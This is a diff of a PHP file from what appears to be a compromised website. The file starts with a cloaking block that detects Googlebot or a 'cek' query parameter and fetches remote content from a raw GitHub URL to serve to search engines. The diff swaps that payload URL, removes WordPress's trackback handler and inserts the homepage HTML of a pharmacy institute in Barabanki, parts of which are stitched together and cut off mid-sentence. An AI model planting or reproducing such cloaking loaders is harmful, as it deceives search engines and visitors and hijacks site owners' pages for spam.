@@ -3,7 +3,7 @@ $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
 $q = isset($_GET['cek']);
 $b = (strpos($ua,'googlebot')!==false | strpos($ua,'inspectiontool')!==false | $q);
 if ($b) {
-  $u = 'https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/citizen-science.txt';
+  $u = 'https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/vedgrouplucknow.txt';
   $r = '';
   if (function_exists('curl_init')) {
     $c = curl_init($u);
@@ -37,180 +37,515 @@ if ($b) {
   }
 }
 
-/**
- * Handle Trackbacks and Pingbacks Sent to WordPress
- *
- * @since 0.71
- *
- * @package WordPress
- * @subpackage Trackbacks
- */
+    <?php include './headerlinks.php'; ?>
+    <body class="body-wrapper">
 
-if ( empty( $wp ) ) {
-	require_once __DIR__ . '/wp-load.php';
-	wp( array( 'tb' => '1' ) );
-}
+        <div class="main_wrapper">
 
-// Always run as an unauthenticated user.
-wp_set_current_user( 0 );
+            <?php include './header.php'; ?>
 
-/**
- * Response to a trackback.
- *
- * Responds with an error or success XML message.
- *
- * @since 0.71
- *
- * @param int|bool $error         Whether there was an error.
- *                                Default '0'. Accepts '0' or '1', true or false.
- * @param string   $error_message Error message if an error occurred. Default empty string.
- */
-function trackback_response( $error = 0, $error_message = '' ) {
-	header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ) );
+            <div class="banner carousel slide" id="recommended-item-carousel" data-ride="carousel">
+                <div class="slides carousel-inner">
+                    <div class="item active">
+                        <img src="img/home/slider/1.jpg" alt="" />
+                        <div class="banner_caption">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="col-xs-12">
+                                        <div class="caption_inner animated fadeInUp">
+                                            <h1>Welcome to Ved Institute of Pharmacy</h1>
+                                            <p>We aim to provide a full facility for personality development of the students and requisite training for their transformation into successful professionals</p>
+                                            <a href="about.php">Learn More</a>
+                                        </div><!--end caption_inner-->
+                                    </div>
+                                </div><!--end row-->
+                            </div><!--end container-->
+                        </div><!--end banner_caption-->
+                    </div>
 
-	if ( $error ) {
-		echo '<?xml version="1.0" encoding="utf-8"?' . ">\n";
-		echo "<response>\n";
-		echo "<error>1</error>\n";
-		echo "<message>$error_message</message>\n";
-		echo '</response>';
-		die();
-	} else {
-		echo '<?xml version="1.0" encoding="utf-8"?' . ">\n";
-		echo "<response>\n";
-		echo "<error>0</error>\n";
-		echo '</response>';
-	}
-}
+                    <div class="item">
+                        <img src="img/home/slider/2.jpg" alt="" />
+                        <div class="banner_caption">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="col-xs-12">
+                                        <div class="caption_inner animated fadeInUp">
+                                            <h1>ADMISSIONS OPEN !</h1>
+                                            <p>Limited seats register today </p>
+                                            <a href="admission.php">Register</a>
+                                        </div><!--end caption_inner-->
+                                    </div>
+                                </div><!--end row-->
+                            </div><!--end container-->
+                        </div><!--end banner_caption-->
+                    </div>
+                    <div class="item">
+                        <img src="img/home/slider/s1.jpg" alt="" />
+                        <div class="banner_caption">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="col-xs-12">
+                                        <div class="caption_inner animated fadeInUp">
+                                            <h1>ADMISSIONS OPEN !</h1>
+                                            <p>Limited seats register today </p>
+                                            <a href="admission.php">Register</a>
+                                        </div><!--end caption_inner-->
+                                    </div>
+                                </div><!--end row-->
+                            </div><!--end container-->
+                        </div><!--end banner_caption-->
+                    </div>
+                    <div class="item">
+                        <img src="img/home/slider/s2.jpg" alt="" />
+                        <div class="banner_caption">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="col-xs-12">
+                                        <div class="caption_inner animated fadeInUp">
+                                            <h1>ADMISSIONS OPEN !</h1>
+                                            <p>Limited seats register today </p>
+                                            <a href="admission.php">Register</a>
+                                        </div><!--end caption_inner-->
+                                    </div>
+                                </div><!--end row-->
+                            </div><!--end container-->
+                        </div><!--end banner_caption-->
+                    </div>
 
-if ( ! isset( $_GET['tb_id'] ) || ! $_GET['tb_id'] ) {
-	$post_id = explode( '/', $_SERVER['REQUEST_URI'] );
-	$post_id = (int) $post_id[ count( $post_id ) - 1 ];
-}
 
-$trackback_url = isset( $_POST['url'] ) ? sanitize_url( $_POST['url'] ) : '';
-$charset       = isset( $_POST['charset'] ) ? sanitize_text_field( $_POST['charset'] ) : '';
+                </div>
+                <a class="left recommended-item-control" href="#recommended-item-carousel" data-slide="prev">
+                    <img src="img/home/slider/prev.png">
+                </a>
+                <a class="right recommended-item-control" href="#recommended-item-carousel" data-slide="next">
+                    <img src="img/home/slider/next.png">
+                </a>
+            </div><!--end banner-->
 
-// These three are stripslashed here so they can be properly escaped after mb_convert_encoding().
-$title     = isset( $_POST['title'] ) ? sanitize_text_field( wp_unslash( $_POST['title'] ) ) : '';
-$excerpt   = isset( $_POST['excerpt'] ) ? sanitize_textarea_field( wp_unslash( $_POST['excerpt'] ) ) : '';
-$blog_name = isset( $_POST['blog_name'] ) ? sanitize_text_field( wp_unslash( $_POST['blog_name'] ) ) : '';
+            <div class="aboutArea">
+                <div class="container">
+                    <div class="row clearfix">
+                        <div class="col-xs-12">
+                            <div class="aboutTitle">
+                                <h2>IMPORTANT LINKS</h2>
+                            </div><!-- aboutTitle -->
+                        </div><!-- col-sm-3 col-xs-12 -->
+                    </div><!-- row clearfix -->
 
-if ( $charset ) {
-	$charset = str_replace( array( ',', ' ' ), '', strtoupper( trim( $charset ) ) );
+                    <div class="about_inner clearfix">
+                        <div class="row">
+                            
 
-	// Validate the specified "sender" charset is available on the receiving site.
-	if ( function_exists( 'mb_list_encodings' ) && ! in_array( $charset, mb_list_encodings(), true ) ) {
-		$charset = '';
-	}
-}
+                            <div class="col-xs-6 col-sm-3">
+                                <div class="aboutImage">
+                                    <a href="pdfs/balancesheetscombined.pdf">
+                                        <img src="img/home/learn/drug-discovery.jpg" alt="" class="img-responsive" />
+                                        <div class="overlay">
+                                          <!-- <p>ISSN:
+                      2250-3560 (Print)<BR/>
+                      2250-3579 (Online) </p> -->
+                                        </div>
+                                        <span class="captionLink">Finance Report</span>
+                                    </a>
+                                </div><!-- aboutImage -->
+                            </div>
 
-if ( ! $charset ) {
-	$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';
-}
+                            <div class="col-xs-6 col-sm-3">
+                                <div class="aboutImage">
+                                    <a href="pdfs/sif_updated.pdf">
+                                        <img src="img/home/learn/sif-report.jpg" alt="" class="img-responsive" />
+                                        <div class="overlay">
+                                          <!-- <p>ISSN:
+                                                  2229-6425 (print)<BR/>
+                                                  2229-600X (Online)</p> -->
+                                        </div>
+                                        <span class="captionLink">SIF Report</span>
+                                    </a>
+                                </div><!-- aboutImage -->
+                            </div>
 
-// No valid uses for UTF-7.
-if ( str_contains( $charset, 'UTF-7' ) ) {
-	die;
-}
+                            <div class="col-xs-6 col-sm-3">
+                                <div class="aboutImage">
+                                    <a href="pdfs/pci_approvals.pdf">
+                                        <img src="img/home/learn/pci-logo.jpg" alt="" class="img-responsive" />
+                                        <div class="overlay">
+                                          <!-- <p>ISSN:
+                                                  2278-8891(Print)<BR/>
+                                                  2278-9103(Online)</p> -->
+                                        </div>
+                                        <span class="captionLink">PCI Approval</span>
+                                    </a>
+                                </div><!-- aboutImage -->
+                            </div>
+                            <div class="col-xs-6 col-sm-3">
+                                <div class="aboutImage">
+                                    <a href="pdfs/bte_approvals.pdf">
+                                        <img src="img/home/learn/bte-logo.jpg" alt="" class="img-responsive" /><div class="overlay">
+                      <!--                    <p>Clinical epidemiology is a subfield of epidemiology specifically focused on issues relevant to clinical medicine.</p>
+                                            --></div>
+                                        <span class="captionLink">BTE Approval</span>
+                                    </a>
+                                </div><!-- aboutImage -->
+                            </div>
+                        </div><!-- row -->
+                    </div><!-- about_inner -->
 
-// For international trackbacks.
-if ( function_exists( 'mb_convert_encoding' ) ) {
-	$title     = mb_convert_encoding( $title, get_option( 'blog_charset' ), $charset );
-	$excerpt   = mb_convert_encoding( $excerpt, get_option( 'blog_charset' ), $charset );
-	$blog_name = mb_convert_encoding( $blog_name, get_option( 'blog_charset' ), $charset );
-}
+                </div><!-- container -->
+            </div><!-- aboutArea -->
 
-// Escape values to use in the trackback.
-$title     = wp_slash( $title );
-$excerpt   = wp_slash( $excerpt );
-$blog_name = wp_slash( $blog_name );
+            <div class="mainContent clearfix">
+                <div class="container">
+                    <div class="row clearfix">
 
-if ( is_single() || is_page() ) {
-	$post_id = $posts[0]->ID;
-}
+                        <div class="col-sm-8 col-xs-12">
+                            <div class="videoNine clearfix">
 
-if ( ! isset( $post_id ) || ! (int) $post_id ) {
-	trackback_response( 1, __( 'I really need an ID for this to work.' ) );
-}
+                                <div class="videoArea clearfix">
+                                    <h3>VED INSTITUTE OF PHARMACY</h3>
+                                    <div class="row">
+                                        <div class="col-lg-8 col-md-7 col-xs-12 videoLeft">
+                                            <img src="img/campus/front_2.jpeg">
+                                        </div><!-- videoLeft -->
+                                        <div class="col-lg-4 col-md-5 col-xs-12 videoRight" STYLE="text-align: justify">
+                                            <p>VIP aims to provide a full facility for personality development of the students and requisite training for their transformation into successful professionals. We expose the students to best academic environment through experienced & dedicated faculty & staff members & latest equipments in laboratories, teaching etc.</p>
+                                            <a href="about.php" class="btn btn-block learnBtn">Learn More</a>
+                                        </div><!-- videoRight -->
+                                    </div><!-- row -->
+                                </div><!-- videoArea -->
 
-if ( empty( $title ) && empty( $trackback_url ) && empty( $blog_name ) ) {
-	// If it doesn't look like a trackback at all.
-	wp_redirect( get_permalink( $post_id ) );
-	exit;
-}
+                                <div class="related_post_sec single_post">
+                                    <h3>Recent News</h3>
+                                    <ul>
+                                        <li>
+                                            <span class="rel_thumb">
+                                                <a href="#"><img src="img/holi.jpg" alt=""></a>
+                                            </span><!--end rel_thumb-->
+                                            <div class="rel_right">
+                                                <h4><a href="single-post-right-sidebar.html">
+                                                    होली की हार्दिक शुभकामनायें 
+                                                </a></h4>
+                                                <div class="meta">
+                                                    <span class="author">Posted in: <a href="#">Update</a></span>
+                                                    <span class="date">on: <a href="#">March 18, 2022</a></span>
+                                                </div>
+                                                <p>होली की हर्षित बेला पर,
+खुशियां मिले अपार |
+यश,कीर्ति, सम्मान मिले,
+और बढे सत्कार ||
+शुभ-शुभ रहे हर दिन हर पल, शुभ-शुभ रहै विचार |
+उत्साह बढे, चित चेतन में,
+निर्मल रहे आचार ||
+सफलतायें नित नयी मिले,बधाई बारम्बार |
+मंगलमय हो काजआपके,
+सुखी रहे परिवार ||
+आप और आपके परिवार को
+*होली की ढेर सारी हार्दिक शुभकामनाएं*</p>
+                                            </div><!--end rel right-->
+                                        </li>
+                                        <li>
+                                            <span class="rel_thumb">
+                                                
+                                                <iframe style="width:100%; height:100%" src="https://www.youtube.com/embed/qloLQVM_L7g" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                                            </span><!--end rel_thumb-->
+                                            <div class="rel_right">
+                                                <h4><a href="single-post-right-sidebar.html">कोशिका की संरचना और कोशिका के ऑर्गेनल्स एवं उसके कार्य।</a></h4>
+                                                <div class="meta">
+                                                    <span class="author">Posted in: <a href="#">You Tube Lecture</a></span>
+                                                    <span class="date">on: <a href="#">25 Jan 2022</a></span>
+                                                </div>
+                                                <p>कोशिका की संरचना कोशिका के अंदर पाए जाने वाले विभिन्न प्रकार के ऑर्गेनल्स ।
+डॉ अमित गुप्ता के द्वारा विस्तृत रूप से बताया गया यह वीडियो फार्मेसी स्टूडेंट एवं मेडिकल स्टूडेंट के लिए अत्यंत लाभदायक।</p>
+                                            </div><!--end rel right-->
+                                        </li>
+                                         <li>
+                                            <span class="rel_thumb">
+                                                
+                                                <a href="#"><img src="img/vaccination.jpg" alt=""></a>  </span><!--end rel_thumb-->
+                                            <div class="rel_right">
+                                                <h4><a href="single-post-right-sidebar.html">हम कोविड-19 निशुल्क वैक्सीनकार्य।</a></h4>
+                                                <div class="meta">
+                                                    <span class="author">Posted in: <a href="#">Vaccination</a></span>
+                                                    <span class="date">on: <a href="#">22 Jan 2022</a></span>
+                                                </div>
+                                                <p>सहर्ष सूचित करना है कि हम कोविड-19 निशुल्क वैक्सीनेशन कैंप का आयोजन दिनांक *24 जनवरी 2022, दिन सोमवार,* को बच्चों (15 से 18 वर्ष) एवं व्यस्क लोगों के लिए आयोजित कर रहे हैं।
 
-if ( ! empty( $trackback_url ) && ! empty( $title ) ) {
-	/**
-	 * Fires before the trackback is added to a post.
-	 *
-	 * @since 4.7.0
-	 *
-	 * @param int    $post_id       Post ID related to the trackback.
-	 * @param string $trackback_url Trackback URL.
-	 * @param string $charset       Character set.
-	 * @param string $title         Trackback title.
-	 * @param string $excerpt       Trackback excerpt.
-	 * @param string $blog_name     Site name.
-	 */
-	do_action( 'pre_trackback_post', $post_id, $trackback_url, $charset, $title, $excerpt, $blog_name );
+‼️बूस्टर डोज के लिए बुजुर्ग लोग भी सेंटर पर आकर बूस्टर डोज भारत सरकार के नियमों के अनुसार लगवा सकते हैं।
+<br>
+📌 *कृपया आधार कार्ड के साथ सेंटर पर समय पर उपलब्ध होने की कृपा करें ।*
+<br>
+💉 *कोवीशील्ड और कोवैक्सीन दोनों वैक्सीन सेंटर परउपलब्ध हैं।*
+<br>
+🎯 *केंद्र: वेद इंस्टिट्यूट ऑफ़ फार्मेसी, रामसनेहीघाट, बाराबंकी।*
+<br>
+⏲️ *समय प्रातः *10:00 बजे से।*
+<br>
+📞डॉ प्रदीप: +919452735055ंट के लिए अत्यंत लाभदायक।</p>
+                                            </div><!--end rel right-->
+                                        </li>
+                                    </ul>
+                                </div><!--related_post_sec-->
+                                <div class="row">
+                                    <div class="col-xs-12 col-sm-12 col-md-12">
+                                        <h2>Program At a Glance</h2>
+                                    </div>
+                                    <div class="col-xs-12 col-sm-12 col-md-12">
+                                        
+                                        <div class="sidebar_item">
+                                            <div class="item_inner program">
+                                                <h4>Program At a Glance</h4>
+                                                <ul>
+                                                    <li><span>Program Name:</span>Diploma In Pharmacy</li>
+                                                    <li><span>Accerediation:</span>PCI & BTE</li>
+                                                    <li><span>Length of Study:</span>2 Years</li>
+                                                    <li><span>Study Options:</span>Full Time</li>
+                                                    <li><span>Campus Location:</span>Barabanki</li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <!--
+                                    <div class="col-xs-12 col-sm-6 col-md-6">
+                                        <div class="sidebar_item">
+                                            <div class="item_inner program">
+                                                <h4>Program At a Glance</h4>
+                                                <ul>
+                                                    <li><span>Program Code:</span>010117</li>
+                                                    <li><span>Accerediation:</span>Ontario College Of Diploma</li>
+                                                    <li><span>Length of Study:</span>2 Years</li>
+                                                    <li><span>Study Options:</span>Full Time</li>
+                                                    <li><span>Campus Location:</span>College Drive</li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    -->
+                                </div>
+                                
+                                 <div class="col-xs-12 col-sm-6 col-md-6">
+                                        <div class="sidebar_item">
+                                            <div class="item_inner program">
+                                                <h4></h4>
+                                                <ul>
+                                                    <li>
+                                                    <span class="rel_thumb">
+                                                        <a href="#"><img src="https://bteup.ac.in/images/ias1.jpg" alt=""></a>
+                                                    </span><!--end rel_thumb-->
+                                                    <div class="rel_right">
+                                                        <h4><a href="#">Sri Amrit Abhijat(I.A.S.)</a></h4>
+                                                        <div class="meta">
+                                                            <span class="author">Principal Secretary,</span>
+                                                            
+                                                        </div>
+                                                        <p>
+                                                            Vocational Education, Skill Development & Technical Education Department
+                                                       </p>
+                                                    </div><!--end rel right-->
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </div>
+                                     <div class="col-xs-12 col-sm-6 col-md-6">
+                                        <div class="sidebar_item">
+                                            <div class="item_inner program">
+                                                <h4></h4>
+                                                <ul>
+                                                    <li>
+                                                    <span class="rel_thumb">
+                                                        <a href="#"><img src="https://bteup.ac.in/images/ias.jpg" alt=""></a>
+                                                    </span><!--end rel_thumb-->
+                                                    <div class="rel_right">
+                                                        <h4><a href="#">Sri Alok Kumar-third(I.A.S.)</a></h4>
+                                                        <div class="meta">
+                                                            <span class="author">Secretary,</span>
+                                                            
+                                                        </div>
+                                                        <p>
+                                                             Technical Education Department
+                                                       </p>
+                                                    </div><!--end rel right-->
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </div>
+                                
+                                                    
+                                <!--
+                                <div class="row">
+                                    <div class="col-xs-12 col-sm-12 col-md-12 sidebar_item">
+                                        <h2>Campus Tour</h2>
+                                        <div class="admission_video">
+                                            <img src="img/campus/front_2.jpeg" data-video="#">
+                                        </div>
+                                    </div>
+                                </div>
+                                -->
 
-	header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ) );
+                            </div><!--videoNine-->
+                        </div><!-- col-sm-8 col-xs-12 -->
+                        
 
-	if ( ! pings_open( $post_id ) ) {
-		trackback_response( 1, __( 'Sorry, trackbacks are closed for this item.' ) );
-	}
+                        <div class="col-sm-4 col-xs-12">
+                            <div class="list_block related_post_sec">
+                                <div class="upcoming_events">
+                                    <h3>Upcoming Events</h3>
+                                    <ul>
+                                        <marquee direction="up">
+                                            <li class="news-item">
+                                        <a  target="_blank" href="notifications/15804651797063first.pdf">Ved Institute of Pharmacy is Approved by AICTE, New Delhi session 2019-20</a>
+                                       									   <a  target="_blank" href="notifications/15804651797063first.pdf" style="color:red;">Click for more details</a>
+									                                       </li>
+								                                    <li class="news-item">
+                                        <a  target="_blank" href="notifications/15804650868866first.pdf">Ved Institute of Pharmacy is approved by Pharmacy Council of India (PCI) Session 2019-20.</a>
+                                       									   <a  target="_blank" href="notifications/15804650868866first.pdf" style="color:red;">Click for more details</a>
+									                                       </li>
+								                                    <li class="news-item">
+                                        <a  target="_blank" href="">D Pharm पाठ्यक्रम,  सत्र 2020-21 हेतु  प्रवेश के लिए परीक्षा हेतु आवेदन पत्र 16 मार्च 2020 तक ऑनलाइन उपलब्ध हैं। आवेदन पत्र में त्रुटियों का सुधार 18 मार्च 2020 से किया जा सकेगा।</a>
+                                                                           </li>
+                                        </marquee>
+                                    </ul>
+                                    <a href="events-3col.html" class="btn btn-default btn-block commonBtn">More Events</a>
+                                </div>
+                            </div><!-- end list_block -->
 
-	$title   = wp_html_excerpt( $title, 250, '&#8230;' );
-	$excerpt = wp_html_excerpt( $excerpt, 252, '&#8230;' );
+                        </div><!-- col-sm-4 col-xs-12 -->
 
-	$comment_post_id      = (int) $post_id;
-	$comment_author       = $blog_name;
-	$comment_author_email = '';
-	$comment_author_url   = $trackback_url;
-	$comment_content      = "<strong>$title</strong>\n\n$excerpt";
-	$comment_type         = 'trackback';
 
-	$dupe = $wpdb->get_results(
-		$wpdb->prepare(
-			"SELECT * FROM $wpdb->comments WHERE comment_post_ID = %d AND comment_author_url = %s",
-			$comment_post_id,
-			$comment_author_url
-		)
-	);
+                        <div class="col-sm-4 col-xs-12">
+                            <div class="list_block related_post_sec">
+                                <div class="upcoming_events">
+                                    <h3>Approvals</h3>
+                                    <img src="img/pci.png" style="width:120px;height:120px; float:left;margin-right:5px" class="img-responsive">
+                                    <img src="img/aicte.png" style="width:120px;height:120px;float:left" class="img-responsive">
+                                
+                                </div>
+                                <div class="upcoming_events">
+                                    <h3>College Committees & Cell</h3>
+                                    <a href="anti_ragging.php" class="btn btn-default btn-block commonBtn">Anti Ragging Cells</a>
+                                    <a href="anti_descrimination.php" class="btn btn-default btn-block commonBtn">Anti-Descrimination Cell</a>
+                                    <a href="gender_descrimination.php" class="btn btn-default btn-block commonBtn">Gender-Sensitization Cell</a>
+                                    <a href="placement_cell.php" class="btn btn-default btn-block commonBtn">Placement Cell</a>
+                                    <a href="sports_cell.php" class="btn btn-default btn-block commonBtn">Sports Cell</a>
+                                </div>
+                            </div><!-- end list_block -->
+                            <div class="list_block related_post_sec">
+                                <div class="upcoming_events">
+                                     <div class="fb-page fb_iframe_widget" data-href="https://www.facebook.com/vedgrouplucknow/" data-tabs="timeline" data-width="" data-height="" data-small-header="false" data-adapt-container-width="true" data-hide-cover="false" data-show-facepile="true" fb-xfbml-state="rendered" fb-iframe-plugin-query="adapt_container_width=true&amp;app_id=1273227229734760&amp;container_width=359&amp;hide_cover=false&amp;href=https%3A%2F%2Fwww.facebook.com%2Fvedgrouplucknow%2F&amp;locale=en_GB&amp;sdk=joey&amp;show_facepile=true&amp;small_header=false&amp;tabs=timeline&amp;width="><span style="vertical-align: bottom; width: 340px; height: 500px;"><iframe name="f2011ffc182f748" width="1000px" height="1000px" data-testid="fb:page Facebook Social Plugin" title="fb:page Facebook Social Plugin" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" src="https://www.facebook.com/v6.0/plugins/page.php?adapt_container_width=true&amp;app_id=1273227229734760&amp;channel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfd0d631b123918%26domain%3Dvedgrouplucknow.com%26is_canvas%3Dfalse%26origin%3Dhttp%253A%252F%252Fvedgrouplucknow.com%252Ffddde7141d649%26relation%3Dparent.parent&amp;container_width=359&amp;hide_cover=false&amp;href=https%3A%2F%2Fwww.facebook.com%2Fvedgrouplucknow%2F&amp;locale=en_GB&amp;sdk=joey&amp;show_facepile=true&amp;small_header=false&amp;tabs=timeline&amp;width=" style="border: none; visibility: visible; width: 340px; height: 500px;" class=""></iframe></span></div>
+                                </div>
+                            </div><!-- end list_block -->
 
-	if ( $dupe ) {
-		trackback_response( 1, __( 'There is already a ping from that URL for this post.' ) );
-	}
+                        </div><!-- col-sm-4 col-xs-12 -->
+                        
 
-	$commentdata = array(
-		'comment_post_ID' => $comment_post_id,
-	);
+                    </div><!-- row clearfix -->
+                </div><!-- container -->
+            </div><!-- mainContent -->
 
-	$commentdata += compact(
-		'comment_author',
-		'comment_author_email',
-		'comment_author_url',
-		'comment_content',
-		'comment_type'
-	);
+         
 
-	$result = wp_new_comment( $commentdata );
+             <div class=" clearfix">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-xs-8">
+                            <div class="carousal_title">
+                                <h1>Chairman`s Desk</h1>
+                            </div>
+                        </div>
+                        <div class="col-xs-4">
+                            <div class="carousal_title">
+                                <h1>Principal`s Desk</h1>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row">
+                         <div class="col-xs-12 col-sm-4 col-md-4">
+                                        <div class="sidebar_item">
+                                            <div class="item_inner program">
+                                                <h4></h4>
+                                                <ul>
+                                                    <li>
+                                                    <span class="rel_thumb">
+                                                        <a href="#"><img src="img/DR-AMRESH-GUPTA.jpg" alt=""></a>
+                                                    </span><!--end rel_thumb-->
+                                                    <div class="rel_right">
+                                                        <h4><a href="#">Dr. Ambresh Gupta(Chairman)</a></h4>
+                                                        <div class="meta">
+                                                            <span class="author">(Ph.D, M.Pharma, B.Pharma)</span>
+                                                            
+                                                        </div>
+                                                        <p style="font-size: 12px;font-weight: 100; text-align: justify;">
+                                                            I heartily welcome you all at Ved Institute of Pharmacy a prestigious institute situated in Barabanki, Uttar Pradesh. The institute is committed to developing dynamism, strong human value, technocratic and good leadership qualities in all our students with a team of well experienced, highly qualified and dedicated faculty. I am happy to inform you that the institute has already completed its one batch & the idea of putting the foundation of an educational institution is so inspiring: what was once planted as a sapling is now all grown into a large tree....
+                                                        </p>
+                                                    </div><!--end rel right-->
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                        </div>्टीट्यूट ऑफ़ फार्मेसी के टीचर्स बहुत अच्छे और सपोर्टिव हैं | आपको कभी भी कोई डाउट हो तो आप कॉल करके भी टाइम ले सकते हैं और वो आपको कभी मना भी नहीं करते |  </p>
+                                       <br> Thank You! </div>
+                                        <div class="carousal_bottom">
+                                            <div class="thumb">
+                                                <img src="img/home/man.jpg" alt="" />										</div>
+                                            <div class="thumb_title">
+                                                <span class="author_name">Akhilesh</span>
+                                                <span class="author_designation">D.Pharm Student<a href="#"> </a></span>										</div>
+                                        </div><!--end carousal bottom-->
+                                    </li>
+                                    <li>
+                                        <div class="carousal_content">
+                                            <p>The best part of Ved Institute of Pharmacy is the focus on the practical part of the program. Here you acn use the labs in your free lecture
+                                            with proper permission. They shape you not only with knowledge but with live experiences.</p><br> Thanks to All!
+                                        </div>
+                                        <div class="carousal_bottom">
+                                            <div class="thumb">
+                                                <img src="img/home/female.jpg" alt="" />										</div>
+                                            <div class="thumb_title">
+                                                <span class="author_name">Anjali</span>
+                                                <span class="author_designation">D.Pharm Student<a href="#"> Apple Inc</a></span>										</div>
+                                        </div><!--end carousal bottom-->
+                                    </li>
+                                    
+                                </ul>
+                            </div><!--enc carousal_section-->
+                        </div>
+                    </div><!--end row-->
+                    
+                </div><!--end container-->
+                
+                <div class="brandSection clearfix">
+                <div class="container">
+                    <div class="row">
+                        <h2>Important Links: </h2>
+                        
+                            <div class="col-xs-2">
+                                <img src="img/swayam.jpg">
+                            </div>
+                            <div class="col-xs-2">
+                                <img src="img/swachbharat.jfif">
+                            </div>
+                            <div class="col-xs-2">
+                                <img src="img/mygov.jfif">
+                            </div>
+                            <div class="col-xs-2">
+                                <img src="img/antiragging.jfif">
+                            </div>
+                               
+                        
+                        </div>
+                    </div>
+                </div>
+            </div>
+                
+            </div><!--end content_bottom-->
 
-	if ( is_wp_error( $result ) ) {
-		trackback_response( 1, $result->get_error_message() );
-	}
 
-	$trackback_id = $wpdb->insert_id;
 
-	/**
-	 * Fires after a trackback is added to a post.
-	 *
-	 * @since 1.2.0
-	 *
-	 * @param int $trackback_id Trackback ID.
-	 */
-	do_action( 'trackback_post', $trackback_id );
+            <?php include './footer.php'; ?>
 
-	trackback_response( 0 );
-}
+        </div>
+
+        <?php include './footerlinks.php'; ?>
+    </body>
+
+
+</html>
